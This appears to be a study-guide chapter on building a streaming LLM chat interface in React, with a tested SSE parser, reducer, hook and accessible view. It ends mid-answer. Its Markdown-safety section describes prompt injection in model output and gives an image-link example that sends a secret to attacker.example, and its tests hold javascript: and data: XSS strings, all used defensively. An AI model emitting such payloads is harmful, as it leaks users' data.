---
title: Building a streaming chat UI in React
goal: Build and defend a React and TypeScript chat interface that streams LLM tokens and agent events smoothly, safely and accessibly.
minutes: 60
---

The JD asks for "low-latency, conversational chat interfaces" that stream LLM responses over SSE or WebSockets, plus
interactive agent workflows. Expect a design question ("walk me through the chat UI"), a few sharp follow-ups (stop
button, races, Markdown safety, accessibility), and possibly a live-coding task. Your resume shows no streaming work, so
this chapter gives you a complete, defensible design. The wire protocols live in [Server-Sent Events](#/sse) and
[WebSockets](#/websockets), and [the streaming project](#/streaming-project) has a runnable version you can demo.

The pieces are: a typed **message model**, a **parser** that turns bytes into events, a **reducer** that turns events
into state, a **hook** that owns the request and its cancellation, and a **view** that renders without re-rendering
everything on every token. Every TypeScript block below that is not a component runs under Node with assertions.

## The pipeline, end to end

```text
user types ─► send(text)
               │  optimistic user message + empty assistant message (status: streaming)
               ▼
        fetch POST /chat  (Accept: text/event-stream, AbortController)
               │  response.body: ReadableStream<Uint8Array>
               ▼
        readSSE(body) ─► { event, data } ─► JSON.parse + validate ─► StreamEvent
               │                                                    token | tool_call | tool_result
               ▼                                                    approval_required | done | error
        batch per animation frame ─► dispatch({ type: 'events', events })
               ▼
        chatReducer ─► messages[] ─► <ChatView> (past messages memoised, only the live one re-renders)
```

Three numbers describe the experience: **time to first token** (TTFT: from Send to the first visible character),
**tokens per second** while streaming, and **render cost** per update. The front end controls the first and third more
than people think: send the request immediately, show the user's message and a typing indicator at once, and keep each
render cheap.

## A message model that fits agents

An agent's reply is not one string. It interleaves text, tool calls, tool results and requests for human approval, so
model the assistant message as a list of **parts** and the stream as a **discriminated union** of events. The reducer is
a pure function, so you can test it without React, a browser or a server.

```ts
import assert from 'node:assert/strict';

// One event per SSE message for an assistant turn.
export type StreamEvent =
  | { type: 'token'; text: string }
  | { type: 'tool_call'; id: string; name: string; args: unknown }
  | { type: 'tool_result'; id: string; ok: boolean; summary: string }
  | { type: 'approval_required'; id: string; action: string }
  | { type: 'done' }
  | { type: 'error'; message: string };

export type Part =
  | { kind: 'text'; text: string }
  | { kind: 'tool'; id: string; name: string; args: unknown; status: 'running' | 'ok' | 'failed'; summary?: string }
  | { kind: 'approval'; id: string; action: string; decision?: 'approved' | 'rejected' };

export type UserMessage = { id: string; role: 'user'; text: string };
export type AssistantMessage = {
  id: string;
  role: 'assistant';
  parts: Part[];
  status: 'streaming' | 'done' | 'stopped' | 'error';
  error?: string;
};
export type Message = UserMessage | AssistantMessage;
export type ChatState = { messages: Message[]; activeId: string | null };

export type ChatAction =
  | { type: 'send'; userId: string; assistantId: string; text: string }
  | { type: 'events'; assistantId: string; events: StreamEvent[] }
  | { type: 'decide'; assistantId: string; approvalId: string; decision: 'approved' | 'rejected' }
  | { type: 'stopped'; assistantId: string }
  | { type: 'ended'; assistantId: string }
  | { type: 'failed'; assistantId: string; message: string };

function applyEvent(msg: AssistantMessage, event: StreamEvent): AssistantMessage {
  switch (event.type) {
    case 'token': {
      const last = msg.parts.at(-1);
      const parts: Part[] =
        last?.kind === 'text'
          ? [...msg.parts.slice(0, -1), { ...last, text: last.text + event.text }]
          : [...msg.parts, { kind: 'text', text: event.text }];
      return { ...msg, parts };
    }
    case 'tool_call':
      return { ...msg, parts: [...msg.parts, { kind: 'tool', id: event.id, name: event.name, args: event.args, status: 'running' }] };
    case 'tool_result':
      return {
        ...msg,
        parts: msg.parts.map((p): Part =>
          p.kind === 'tool' && p.id === event.id ? { ...p, status: event.ok ? 'ok' : 'failed', summary: event.summary } : p,
        ),
      };
    case 'approval_required':
      return { ...msg, parts: [...msg.parts, { kind: 'approval', id: event.id, action: event.action }] };
    case 'done':
      return { ...msg, status: 'done' };
    case 'error':
      return { ...msg, status: 'error', error: event.message };
  }
}

function updateAssistant(state: ChatState, id: string, fn: (m: AssistantMessage) => AssistantMessage): ChatState {
  const messages = state.messages.map((m) => (m.id === id && m.role === 'assistant' ? fn(m) : m));
  const updated = messages.find((m) => m.id === id);
  const finished = updated?.role === 'assistant' && updated.status !== 'streaming';
  return { messages, activeId: finished && state.activeId === id ? null : state.activeId };
}

export function chatReducer(state: ChatState, action: ChatAction): ChatState {
  switch (action.type) {
    case 'send': {
      // Only one live stream: anything still streaming is marked stopped (the hook aborts its request).
      const settled = state.messages.map((m): Message => (m.role === 'assistant' && m.status === 'streaming' ? { ...m, status: 'stopped' } : m));
      return {
        messages: [
          ...settled,
          { id: action.userId, role: 'user', text: action.text },
          { id: action.assistantId, role: 'assistant', parts: [], status: 'streaming' },
        ],
        activeId: action.assistantId,
      };
    }
    case 'events':
      // Late events from a stream that was stopped or already finished are ignored.
      return updateAssistant(state, action.assistantId, (m) => (m.status === 'streaming' ? action.events.reduce(applyEvent, m) : m));
    case 'decide':
      return updateAssistant(state, action.assistantId, (m) => ({
        ...m,
        parts: m.parts.map((p): Part => (p.kind === 'approval' && p.id === action.approvalId ? { ...p, decision: action.decision } : p)),
      }));
    case 'stopped':
      return updateAssistant(state, action.assistantId, (m) => (m.status === 'streaming' ? { ...m, status: 'stopped' } : m));
    case 'ended':
      // The stream closed without a 'done' event: the connection dropped mid-answer.
      return updateAssistant(state, action.assistantId, (m) =>
        m.status === 'streaming' ? { ...m, status: 'error', error: 'The connection closed before the response finished.' } : m,
      );
    case 'failed':
      return updateAssistant(state, action.assistantId, (m) => (m.status === 'streaming' ? { ...m, status: 'error', error: action.message } : m));
  }
}

// --- checks ---
const assistant = (s: ChatState, id: string): AssistantMessage => {
  const m = s.messages.find((x) => x.id === id);
  if (m?.role !== 'assistant') throw new Error(`no assistant message ${id}`);
  return m;
};

let s: ChatState = { messages: [], activeId: null };
s = chatReducer(s, { type: 'send', userId: 'u1', assistantId: 'a1', text: 'Close ticket 42' });
assert.equal(s.activeId, 'a1');
s = chatReducer(s, {
  type: 'events',
  assistantId: 'a1',
  events: [
    { type: 'token', text: 'Looking ' },
    { type: 'token', text: 'it up.' },
    { type: 'tool_call', id: 't1', name: 'get_ticket', args: { id: 42 } },
    { type: 'tool_result', id: 't1', ok: true, summary: 'Ticket 42 is open' },
    { type: 'approval_required', id: 'ap1', action: 'Close ticket 42' },
  ],
});
const a1 = assistant(s, 'a1');
assert.deepEqual(a1.parts.map((p) => p.kind), ['text', 'tool', 'approval']);
assert.deepEqual(a1.parts[0], { kind: 'text', text: 'Looking it up.' });
assert.equal(a1.parts[1].kind === 'tool' && a1.parts[1].status, 'ok');

s = chatReducer(s, { type: 'decide', assistantId: 'a1', approvalId: 'ap1', decision: 'approved' });
assert.equal(assistant(s, 'a1').parts[2].kind === 'approval' && (assistant(s, 'a1').parts[2] as { decision?: string }).decision, 'approved');

s = chatReducer(s, { type: 'events', assistantId: 'a1', events: [{ type: 'token', text: ' Done.' }, { type: 'done' }] });
assert.equal(assistant(s, 'a1').status, 'done');
assert.equal(s.activeId, null);

// A late token after 'done' changes nothing.
const before = s;
s = chatReducer(s, { type: 'events', assistantId: 'a1', events: [{ type: 'token', text: 'ghost' }] });
assert.deepEqual(s, before);

// Sending while a stream is live stops the old one; its late events are ignored.
s = chatReducer(s, { type: 'send', userId: 'u2', assistantId: 'a2', text: 'Summarise run 7' });
s = chatReducer(s, { type: 'send', userId: 'u3', assistantId: 'a3', text: 'Actually, run 8' });
assert.equal(assistant(s, 'a2').status, 'stopped');
s = chatReducer(s, { type: 'events', assistantId: 'a2', events: [{ type: 'token', text: 'late' }] });
assert.deepEqual(assistant(s, 'a2').parts, []);
assert.equal(s.activeId, 'a3');

// The stream closing without 'done' is an interruption, not a success.
s = chatReducer(s, { type: 'ended', assistantId: 'a3' });
assert.equal(assistant(s, 'a3').status, 'error');
assert.equal(s.activeId, null);
console.log('reducer ok');
```

Points to say out loud: the union makes illegal states unrepresentable (a tool part always has a status), `switch` on
`type` is checked for exhaustiveness by TypeScript, and the reducer guards against **late events**, which is the bug
most streaming UIs ship with.

## Turning bytes into events

`fetch` gives you `response.body`, a `ReadableStream<Uint8Array>`. Chunks arrive however the network splits them, so
one chunk can hold half an event, three events, or half of a multi-byte character. Two rules make a parser correct:

- Decode with `new TextDecoder()` and `decoder.decode(chunk, { stream: true })`, so a UTF-8 character split across two
  chunks is held back until it is complete.
- Buffer text and only cut at an event boundary (a blank line in SSE, a newline in NDJSON). Keep the remainder for the
  next chunk.

This is a compact SSE reader for the chat client. The [Server-Sent Events](#/sse) chapter covers every field of the format.

```ts
import assert from 'node:assert/strict';

// `id` is the last event ID at the moment the event was dispatched. As in the spec, it carries over from
// earlier events until a new `id:` line replaces it.
export type SSEMessage = { event: string; data: string; id?: string };

function parseEvent(block: string, lastId: string | undefined): { message: SSEMessage | null; lastId: string | undefined } {
  let event = '';
  const data: string[] = [];
  for (const line of block.split('\n')) {
    if (line === '' || line.startsWith(':')) continue; // blank or comment (keep-alive)
    const colon = line.indexOf(':');
    const field = colon === -1 ? line : line.slice(0, colon);
    let value = colon === -1 ? '' : line.slice(colon + 1);
    if (value.startsWith(' ')) value = value.slice(1);
    if (field === 'data') data.push(value);
    else if (field === 'event') event = value;
    else if (field === 'id' && !value.includes('\0')) lastId = value; // an id containing NUL is ignored
    // 'retry' is ignored: this client runs its own reconnect policy.
  }
  // The id is committed here, at the blank line, even for a block with no data; only blocks with data are delivered.
  return { message: data.length ? { event: event || 'message', data: data.join('\n'), id: lastId } : null, lastId };
}

/** Yields one message per SSE event from a fetch body, however the bytes are split into chunks. */
export async function* readSSE(body: ReadableStream<Uint8Array>): AsyncGenerator<SSEMessage> {
  const reader = body.getReader();
  const decoder = new TextDecoder(); // also drops a leading byte-order mark, as the spec requires
  let buffer = '';
  let lastId: string | undefined;
  let pendingCR = false; // a chunk ended in '\r'; if the next starts with '\n' it is the same line ending
  let finished = false;
  const normalise = (text: string) => {
    if (text === '') return ''; // an empty chunk (or a held-back partial character) must not clear pendingCR
    if (pendingCR && text.startsWith('\n')) text = text.slice(1);
    pendingCR = text.endsWith('\r');
    return text.replace(/\r\n?/g, '\n');
  };
  try {
    while (true) {
      const { value, done } = await reader.read();
      buffer += normalise(done ? decoder.decode() : decoder.decode(value, { stream: true }));
      let cut: number;
      while ((cut = buffer.indexOf('\n\n')) !== -1) {
        const parsed = parseEvent(buffer.slice(0, cut), lastId);
        buffer = buffer.slice(cut + 2);
        lastId = parsed.lastId;
        if (parsed.message) yield parsed.message;
      }
      if (done) {
        finished = true;
        return; // an unterminated last block is incomplete, so it is dropped
      }
    }
  } finally {
    // The consumer stopped early (break, or an exception): release the connection.
    if (!finished) await reader.cancel().catch(() => {});
  }
}

// --- checks ---
const enc = new TextEncoder();
const streamOf = (...chunks: (string | Uint8Array)[]) =>
  new ReadableStream<Uint8Array>({
    start(controller) {
      for (const c of chunks) controller.enqueue(typeof c === 'string' ? enc.encode(c) : c);
      controller.close();
    },
  });
const collect = async (body: ReadableStream<Uint8Array>) => {
  const out: SSEMessage[] = [];
  for await (const m of readSSE(body)) out.push(m);
  return out;
};

// Events split across chunks, a keep-alive comment, an id and a named event.
assert.deepEqual(await collect(streamOf('data: {"type":"tok', 'en","text":"Hi"}\n', '\n: ping\n\nid: 7\nevent: done\ndata: {}\n\n')), [
  { event: 'message', data: '{"type":"token","text":"Hi"}', id: undefined },
  { event: 'done', data: '{}', id: '7' },
]);

// A four-byte emoji split in the middle still decodes.
const bytes = enc.encode('data: héllo 👋\n\n');
const mid = bytes.length - 4; // inside the emoji
assert.deepEqual((await collect(streamOf(bytes.slice(0, mid), bytes.slice(mid))))[0].data, 'héllo 👋');

// CRLF split across chunks: "a" and "b" are two data lines of ONE event.
assert.deepEqual((await collect(streamOf('data: a\r', '\ndata: b\r\n\r\n')))[0].data, 'a\nb');
assert.deepEqual((await collect(streamOf('data: a\r', new Uint8Array(0), '\ndata: b\r\n\r\n')))[0].data, 'a\nb'); // empty chunk in between

// An event cut off by the end of the stream is discarded, never half-delivered, and its id is not committed.
assert.deepEqual(await collect(streamOf('data: complete\n\n', 'id: 9\ndata: cut off')), [{ event: 'message', data: 'complete', id: undefined }]);

// The last event ID carries over, and an id-only block (no data) still commits its id.
assert.deepEqual(await collect(streamOf('id: 7\ndata: a\n\n', 'data: b\n\n', 'id: 8\n\n', 'data: c\n\n')), [
  { event: 'message', data: 'a', id: '7' },
  { event: 'message', data: 'b', id: '7' },
  { event: 'message', data: 'c', id: '8' },
]);

// A leading BOM is dropped, an empty event name means 'message', and an id containing NUL is ignored.
assert.deepEqual(await collect(streamOf('\uFEFFevent:\nid: a\0b\ndata: x\n\n')), [{ event: 'message', data: 'x', id: undefined }]);

// Stopping early cancels the underlying stream.
let cancelled = false;
const endless = new ReadableStream<Uint8Array>({
  pull(controller) {
    controller.enqueue(enc.encode('data: x\n\n'));
  },
  cancel() {
    cancelled = true;
  },
});
for await (const m of readSSE(endless)) {
  assert.equal(m.data, 'x');
  break;
}
assert.equal(cancelled, true);
console.log('parser ok');
```

Why not `EventSource`? It only does GET, cannot send an `Authorization` header or a JSON body, and reconnects on its own
(which re-runs an expensive LLM call unless the server supports resume). For chat, **fetch streaming** is the usual
choice. `EventSource` is fine for read-only feeds such as a dashboard. Validate each parsed event with a schema (zod)
before it reaches the reducer: the server is a boundary.

## Appending tokens without re-rendering everything

A model can emit 30–100 tokens per second. Each network chunk arrives in its own task, so React renders once per chunk,
and if every render re-renders the whole message list, long conversations start to stutter. Fix it in layers:

1. **Batch per frame.** Queue incoming events and dispatch them together once per `requestAnimationFrame` (at most about
   60 renders per second, and each one handles every token that arrived in between).
2. **Only the live message re-renders.** Finished messages are wrapped in `React.memo`. Because the reducer is
   immutable, an untouched message keeps the same object reference, so memo skips it.
3. **Memoise finished Markdown blocks** inside the live message too (see the next section), so the parser only re-runs
   on the paragraph that is still changing.
4. **Keep strings, not token arrays.** Concatenating into one text part is cheap. Arrays of thousands of token objects
   are not.

```tsx
import { useCallback, useEffect, useRef } from 'react';

/** Collects items and hands them over in one batch, at most once per animation frame. */
export function useFrameBatcher<T>(flush: (items: T[]) => void) {
  const queue = useRef<T[]>([]);
  const frame = useRef<number | null>(null);
  const flushRef = useRef(flush);
  useEffect(() => {
    flushRef.current = flush;
  });

  const drain = useCallback(() => {
    frame.current = null;
    const items = queue.current;
    queue.current = [];
    if (items.length) flushRef.current(items);
  }, []);

  const push = useCallback(
    (item: T) => {
      queue.current.push(item);
      if (frame.current === null) frame.current = requestAnimationFrame(drain);
    },
    [drain],
  );

  // Flush immediately (for example on 'done'), so the final state never waits for a frame.
  const flushNow = useCallback(() => {
    if (frame.current !== null) cancelAnimationFrame(frame.current);
    drain();
  }, [drain]);

  useEffect(
    () => () => {
      if (frame.current !== null) cancelAnimationFrame(frame.current);
    },
    [],
  );
  return { push, flushNow };
}
```

One catch worth mentioning: browsers do not run `requestAnimationFrame` in a hidden tab. Events then pile up in the
queue until the user comes back, which is fine for a single chat answer. For a long-running stream, switch to a
`setTimeout` flush while `document.visibilityState === 'hidden'`.

## The useChatStream hook

The hook owns the request lifecycle: one `AbortController` per send, an optimistic user message, the loop over the
stream, and the three ways a stream can end (finished, stopped by the user, failed). The reducer and parser from above are
declared here so the module type-checks on its own. In a project they would be imports.

```tsx
import { useCallback, useEffect, useReducer, useRef } from 'react';

// From the sections above (chat-model.ts and sse.ts in a real project).
type StreamEvent = { type: 'token'; text: string } | { type: 'done' } | { type: 'error'; message: string } | { type: string };
type ChatState = { messages: unknown[]; activeId: string | null };
type ChatAction =
  | { type: 'send'; userId: string; assistantId: string; text: string }
  | { type: 'events'; assistantId: string; events: StreamEvent[] }
  | { type: 'decide'; assistantId: string; approvalId: string; decision: 'approved' | 'rejected' }
  | { type: 'stopped' | 'ended'; assistantId: string }
  | { type: 'failed'; assistantId: string; message: string };
declare function chatReducer(state: ChatState, action: ChatAction): ChatState;
declare function readSSE(body: ReadableStream<Uint8Array>): AsyncGenerator<{ event: string; data: string; id?: string }>;
declare function parseStreamEvent(data: string): StreamEvent; // JSON.parse + zod validation

export function useChatStream(url: string) {
  const [state, dispatch] = useReducer(chatReducer, { messages: [], activeId: null });
  const controllerRef = useRef<AbortController | null>(null);

  const stop = useCallback(() => controllerRef.current?.abort(), []);

  const send = useCallback(
    async (text: string) => {
      controllerRef.current?.abort(); // one stream at a time
      const controller = new AbortController();
      controllerRef.current = controller;
      const assistantId = crypto.randomUUID();
      dispatch({ type: 'send', userId: crypto.randomUUID(), assistantId, text });

      try {
        const res = await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', Accept: 'text/event-stream' },
          body: JSON.stringify({ message: text }),
          signal: controller.signal,
          credentials: 'include', // session cookie from the BFF, not a token in localStorage
        });
        if (res.status === 429) {
          const wait = res.headers.get('Retry-After'); // seconds, or an HTTP date
          throw new Error(wait && /^\d+$/.test(wait) ? `Too many requests. Try again in ${wait} seconds.` : 'Too many requests. Try again shortly.');
        }
        if (!res.ok || !res.body) throw new Error(`The assistant is unavailable (HTTP ${res.status}).`);

        for await (const message of readSSE(res.body)) {
          // Batch with useFrameBatcher in production; dispatching per event keeps the example short.
          dispatch({ type: 'events', assistantId, events: [parseStreamEvent(message.data)] });
        }
        dispatch({ type: 'ended', assistantId }); // a no-op if 'done' already arrived
      } catch (err) {
        if (controller.signal.aborted) dispatch({ type: 'stopped', assistantId });
        else dispatch({ type: 'failed', assistantId, message: err instanceof Error ? err.message : 'Something went wrong.' });
      } finally {
        if (controllerRef.current === controller) controllerRef.current = null;
      }
    },
    [url],
  );

  // Leaving the page or unmounting the chat cancels the request, so the server can stop generating.
  useEffect(() => () => controllerRef.current?.abort(), []);

  return { messages: state.messages, isStreaming: state.activeId !== null, send, stop };
}
```

What to highlight:

- **Stop** is just `abort()`. The pending `reader.read()` rejects, the `catch` sees `signal.aborted`, and the message
  becomes "stopped" instead of an error. Aborting also closes the HTTP connection, which the server should detect and use
  to cancel the model call (otherwise you keep paying for tokens nobody sees).
- **Races**: a new send aborts the previous controller, and the reducer ignores late events for a message that is no
  longer streaming. The `finally` only clears the ref if it still points at *this* controller.
- **Unmount** aborts too. In development, StrictMode mounts, unmounts and remounts components to prove cleanups exist.

## Rendering partial Markdown safely

Model output is untrusted input: it can contain text a user pasted, text from a web page a tool fetched, or a prompt
injection. Rules:

- **Never** pass raw model output to `dangerouslySetInnerHTML`. Render it as text, or with a Markdown renderer that
  produces React elements. react-markdown builds React elements rather than an HTML string, escapes raw HTML by
  default (it is only rendered if you add `rehype-raw`, which you should not do for model output), and its default
  `urlTransform` keeps only `http`, `https`, `mailto`, `irc`, `ircs` and `xmpp` links plus relative URLs. If you must
  produce HTML, sanitise it with an allow-list sanitiser such as DOMPurify.
- **Links**: allow only `https:`, `http:` and `mailto:`, and add `rel="noopener noreferrer"`. A `javascript:` URL in a
  link is XSS.
- **Images are an exfiltration channel.** An injected `![](https://attacker.example/?d=<secret>)` makes the browser send
  data in the URL as soon as it renders. Block external images, or only allow approved hosts or a proxy.
- **Partial Markdown flickers.** Mid-stream, a code fence is open until its closing backticks arrive, so everything
  after it renders as plain text and then suddenly turns into code. Split the text into **finished blocks** (memoised,
  never re-parsed) and a **tail** that is still changing, and close an open fence in the tail before rendering it.

```ts
import assert from 'node:assert/strict';

const FENCE = /^\s*(```|~~~)/;

/** Splits streamed Markdown into finished blocks (safe to memoise) and the tail that is still changing. */
export function splitStable(markdown: string): { done: string[]; tail: string } {
  const done: string[] = [];
  let current: string[] = [];
  let inFence = false;
  for (const line of markdown.split('\n')) {
    if (FENCE.test(line)) inFence = !inFence;
    if (line.trim() === '' && !inFence) {
      if (current.some((l) => l.trim() !== '')) done.push(current.join('\n'));
      current = [];
    } else {
      current.push(line);
    }
  }
  return { done, tail: current.join('\n') };
}

/** Closes a code fence that is still open, so a half-streamed code block renders as code. */
export function closeOpenFence(text: string): string {
  const fences = text.split('\n').filter((l) => FENCE.test(l)).length;
  return fences % 2 === 1 ? `${text}\n\`\`\`` : text;
}

/** Only absolute http(s) and mailto links survive; everything else renders as plain text. */
export function safeHref(raw: string): string | null {
  try {
    const url = new URL(raw);
    return ['https:', 'http:', 'mailto:'].includes(url.protocol) ? url.href : null;
  } catch {
    return null; // relative or malformed
  }
}

// --- checks ---
const streamed = 'Here is the plan.\n\n```ts\nconst a = 1;\n\nconst b = 2;';
assert.deepEqual(splitStable(streamed), { done: ['Here is the plan.'], tail: '```ts\nconst a = 1;\n\nconst b = 2;' });
assert.equal(closeOpenFence(splitStable(streamed).tail), '```ts\nconst a = 1;\n\nconst b = 2;\n```');
assert.equal(closeOpenFence('```ts\nx\n```'), '```ts\nx\n```');

const finished = 'Para one.\n\n- a\n- b\n\n';
assert.deepEqual(splitStable(finished), { done: ['Para one.', '- a\n- b'], tail: '' });

assert.equal(safeHref('https://cloud.google.com/run'), 'https://cloud.google.com/run');
assert.equal(safeHref('javascript:alert(1)'), null);
assert.equal(safeHref('  JAVASCRIPT:alert(1)'), null); // the URL parser trims and lower-cases the scheme
assert.equal(safeHref('data:text/html,<script>alert(1)</script>'), null);
assert.equal(safeHref('/relative/path'), null);
console.log('markdown helpers ok');
```

## The view: scrolling, parts and accessibility

The view is a presentational component: it gets messages and callbacks as props, which makes it easy to test with
React Testing Library and to reuse with a different transport. Details interviewers notice:

- **Auto-scroll that respects the reader.** Stick to the bottom only while the user is near the bottom. If they scroll
  up to reread, stop following and show a "Jump to latest" button. Use instant scrolling while streaming: smooth
  scrolling fires scroll events mid-animation that can look like the user scrolling away.
- **Tool calls and approvals inline.** A tool call is a collapsible card with its name, arguments (rendered as text
  with `JSON.stringify`, never as HTML) and status. An approval is a card with Approve and Reject buttons that are
  disabled once a decision is sent.
- **Accessibility.** Do not put the streaming text in a live region: a screen reader would try to announce every token.
  Mark the streaming message `aria-busy="true"`, and use one separate, visually hidden `role="status"` region for short
  announcements ("Assistant is responding", "Response complete", "Stopped"). Keep focus in the input after sending,
  never move focus on each token, and make Stop reachable by keyboard (Escape in the input is a nice touch).
- **Enter to send, Shift+Enter for a new line**, and ignore Enter while an IME composition is in progress
  (`nativeEvent.isComposing`), or users typing Japanese or Chinese send half-finished messages.

```tsx
import { memo, useCallback, useLayoutEffect, useRef, useState, type FormEvent, type KeyboardEvent } from 'react';

type Part =
  | { kind: 'text'; text: string }
  | { kind: 'tool'; id: string; name: string; args: unknown; status: 'running' | 'ok' | 'failed'; summary?: string }
  | { kind: 'approval'; id: string; action: string; decision?: 'approved' | 'rejected' };
type Message =
  | { id: string; role: 'user'; text: string }
  | { id: string; role: 'assistant'; parts: Part[]; status: 'streaming' | 'done' | 'stopped' | 'error'; error?: string };

type Props = {
  messages: Message[];
  isStreaming: boolean;
  onSend: (text: string) => void;
  onStop: () => void;
  onDecide: (messageId: string, approvalId: string, decision: 'approved' | 'rejected') => void;
};

function useStickToBottom(trigger: unknown, threshold = 48) {
  const ref = useRef<HTMLDivElement>(null);
  const [pinned, setPinned] = useState(true);
  const onScroll = useCallback(() => {
    const el = ref.current;
    if (el) setPinned(el.scrollHeight - el.scrollTop - el.clientHeight <= threshold);
  }, [threshold]);
  useLayoutEffect(() => {
    const el = ref.current;
    if (el && pinned) el.scrollTop = el.scrollHeight; // before paint, so there is no jump
  }, [trigger, pinned]);
  const jumpToLatest = useCallback(() => setPinned(true), []);
  return { ref, onScroll, pinned, jumpToLatest };
}

const PartView = memo(function PartView({ part, onDecide }: { part: Part; onDecide: (id: string, d: 'approved' | 'rejected') => void }) {
  if (part.kind === 'text') return <p className="msg-text">{part.text}</p>; // a Markdown renderer would go here
  if (part.kind === 'tool') {
    return (
      <details className={`tool tool-${part.status}`}>
        <summary>
          Used <code>{part.name}</code>: {part.status === 'running' ? 'running…' : part.status === 'ok' ? 'done' : 'failed'}
        </summary>
        <pre>{JSON.stringify(part.args, null, 2)}</pre>
        {part.summary && <p>{part.summary}</p>}
      </details>
    );
  }
  return (
    <div className="approval" role="group" aria-label={`Approval needed: ${part.action}`}>
      <p>
        The agent wants to: <strong>{part.action}</strong>
      </p>
      {part.decision ? (
        <p>You {part.decision} this action.</p>
      ) : (
        <>
          <button type="button" onClick={() => onDecide(part.id, 'approved')}>
            Approve
          </button>
          <button type="button" onClick={() => onDecide(part.id, 'rejected')}>
            Reject
          </button>
        </>
      )}
    </div>
  );
});

// Finished messages keep the same object reference (immutable reducer), so memo skips them.
const MessageView = memo(function MessageView({ message, onDecide }: { message: Message; onDecide: Props['onDecide'] }) {
  if (message.role === 'user') {
    return (
      <article className="msg user" aria-label="You">
        <p>{message.text}</p>
      </article>
    );
  }
  return (
    <article className="msg assistant" aria-label="Assistant" aria-busy={message.status === 'streaming'}>
      {message.parts.map((part, i) => (
        <PartView key={part.kind === 'text' ? `text-${i}` : part.id} part={part} onDecide={(id, d) => onDecide(message.id, id, d)} />
      ))}
      {message.status === 'stopped' && <p className="note">Stopped.</p>}
      {message.status === 'error' && <p className="note error">{message.error}</p>}
    </article>
  );
});

export function ChatView({ messages, isStreaming, onSend, onStop, onDecide }: Props) {
  const [draft, setDraft] = useState('');
  const last = messages.at(-1);
  const { ref, onScroll, pinned, jumpToLatest } = useStickToBottom(last);
  const status = isStreaming ? 'Assistant is responding' : last?.role === 'assistant' ? `Response ${last.status === 'done' ? 'complete' : last.status}` : '';

  function submit(e?: FormEvent) {
    e?.preventDefault();
    const text = draft.trim();
    if (!text || isStreaming) return;
    onSend(text);
    setDraft('');
    jumpToLatest(); // sending a message always follows the new answer again
  }

  function onKeyDown(e: KeyboardEvent<HTMLTextAreaElement>) {
    if (e.key === 'Enter' && !e.shiftKey && !e.nativeEvent.isComposing) {
      e.preventDefault();
      submit();
    } else if (e.key === 'Escape' && isStreaming) {
      onStop();
    }
  }

  return (
    <section className="chat" aria-label="Chat with the agent">
      {/* A named region, not role="log": a log is a live region and would read out every token. */}
      <div className="messages" ref={ref} onScroll={onScroll} tabIndex={0} role="region" aria-label="Conversation">
        {messages.map((m) => (
          <MessageView key={m.id} message={m} onDecide={onDecide} />
        ))}
      </div>
      {!pinned && (
        <button type="button" className="jump" onClick={jumpToLatest}>
          Jump to latest
        </button>
      )}
      <p role="status" className="visually-hidden">
        {status}
      </p>
      <form onSubmit={submit}>
        <label htmlFor="chat-input">Message</label>
        <textarea id="chat-input" value={draft} onChange={(e) => setDraft(e.target.value)} onKeyDown={onKeyDown} rows={2} />
        {isStreaming ? (
          <button type="button" onClick={onStop}>
            Stop
          </button>
        ) : (
          <button type="submit" disabled={!draft.trim()}>
            Send
          </button>
        )}
      </form>
    </section>
  );
}
```

The `onDecide` arrow inside `MessageView` creates a new function per render, so `PartView`'s memo does not help the live
message. That is acceptable (only one message is live). Mention it if asked, and fix it with `useCallback` plus a
stable `messageId` prop if profiling shows it matters.

## Errors, retries and resuming

| What happened | How you detect it | What the user sees | What you do |
|---|---|---|---|
| User pressed Stop | `signal.aborted` in `catch` | Partial text plus "Stopped" | Nothing. Offer Regenerate |
| Connection dropped mid-answer | Stream ends without `done`, or `read()` rejects with a network error | Partial text plus "Interrupted" | Resume with the last event id if the server supports it, otherwise offer Retry |
| Server sent an `error` event | Event in the stream | Partial text plus the error message | Retry if the server marks it retryable |
| 429 rate limit | `res.status === 429` | "Too many requests, try again in 20 s" with a countdown | Read `Retry-After`. Disable Send until it passes |
| Silence (no bytes for a long time) | A watchdog timer reset on every chunk. The server sends keep-alive comments, say every 15 s | "Still working…" then "Timed out" | Abort after a threshold and offer Retry |
| Request never started (offline) | `fetch` rejects before a response | User message marked "Not sent" with Retry | Keep the draft. Retry on reconnect |

**Resume** needs the server's help. If the run is decoupled from the HTTP request (the server writes events with
sequence numbers to a log such as Redis Streams or Firestore), the client reconnects with the last id it saw
(`Last-Event-ID` header or `?after=42`) and continues without re-running the model. That is how the
[streaming project](#/streaming-project) works. Record the last id only from events you actually received in full
(the parser yields an event at its closing blank line), never from an `id:` line of an event that was cut off. Otherwise
a reconnect would skip the event that never arrived. Browsers' `EventSource` follows the same rule: the id is committed
when the event is dispatched, and it carries over to later events that have no `id:` line, which is why the parser
above passes `lastId` from block to block.

## Interview questions

### Walk me through how you would build a chat UI that streams LLM responses. {core}

I would POST the message with `fetch` and read `response.body` as a stream, parse it into typed events (tokens, tool
calls, approvals, done, error), and feed those into a pure reducer that owns the message list. A hook wraps the request
with an AbortController for Stop and for cancelling on unmount or on a new send. The view batches token updates per
animation frame and memoises finished messages, so only the live message re-renders. On top of that I add safe Markdown
rendering, auto-scroll that respects the reader, and accessible status announcements.

Then go one level deeper on whichever part they pick: the parser (chunk boundaries, UTF-8), the reducer (late events),
or performance (batching, memo). Close with what you would measure: time to first token and dropped frames.

### Why use fetch streaming rather than EventSource for a chat interface? {core}

`EventSource` only makes GET requests, cannot set headers such as `Authorization`, cannot send a JSON body, and
reconnects automatically. For chat I need to POST the conversation, often with a bearer token, and an automatic
reconnect would re-run the expensive model call unless the server supports resume. `fetch` with a `ReadableStream` gives
me POST, headers, an AbortController for Stop, and full control over reconnects. `EventSource` is still a good fit for
read-only feeds such as a run-status dashboard, where its built-in reconnect and `Last-Event-ID` are a feature.

### How do you parse a streamed response when chunks split events or characters? {core}

Chunks are arbitrary slices of bytes. I decode with one `TextDecoder` using `{ stream: true }`, so a multi-byte UTF-8
character split across chunks is kept until it is complete, and I append to a text buffer and only cut at event
boundaries: a blank line for SSE, a newline for NDJSON. Whatever is left after the last boundary waits for the next
chunk. I also normalise CRLF, including a `\r` and `\n` split across two chunks, and ignore comment lines that servers
send as keep-alives.

The classic bugs are calling `decode(chunk)` without `stream: true` (garbled emoji and accented characters) and
`JSON.parse` on each chunk (fails whenever an event is split).

### Updating state on every token makes the UI stutter. How do you fix it? {core}

Batch and isolate. I queue incoming events and dispatch them once per animation frame, so there are at most about 60
renders a second and each handles every token received since the last one. I keep the reducer immutable so finished
